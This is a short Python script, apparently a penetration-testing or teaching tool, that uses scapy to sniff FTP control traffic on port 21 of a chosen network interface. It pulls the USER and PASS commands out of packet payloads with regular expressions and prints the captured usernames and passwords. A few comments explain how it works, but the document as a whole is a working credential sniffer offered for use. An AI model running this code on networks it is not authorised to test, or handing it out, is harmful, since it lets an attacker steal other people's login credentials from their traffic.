# How It Works

#     Filter: tcp port 21 — captures FTP control traffic.

#     Payload extraction: It decodes the TCP payload using UTF-8, ignoring decode errors.

#     Regex: Extracts "USER" and "PASS" commands from raw text data.

#     Output: Prints credentials when detected.


import re
import argparse
from scapy.all import sniff
from scapy.layers.inet import IP, TCP

def ftp_sniff(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and hasattr(packet[TCP], 'payload'):
        dest = packet[IP].dst
        raw = bytes(packet[TCP].payload).decode('utf-8', errors='ignore')

        user = re.findall(r'(?i)USER (.*)', raw)
        password = re.findall(r'(?i)PASS (.*)', raw)

        if user:
            print(f'[*] Detected FTP Login to {dest}')
            print(f'[+] User account: {user[0].strip()}')
        if password:
            print(f'[+] Password: {password[0].strip()}')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ftp_sniff.py <interface>')
    parser.add_argument('interface', type=str, metavar='INTERFACE', help='Specify the interface to listen on')
    args = parser.parse_args()

    try:
        print(f"[*] Starting FTP sniffer on interface {args.interface}")
        sniff(iface=args.interface, filter='tcp port 21', prn=ftp_sniff, store=False)
    except KeyboardInterrupt:
        print("\n[*] Stopping sniffer...")
        exit(0)
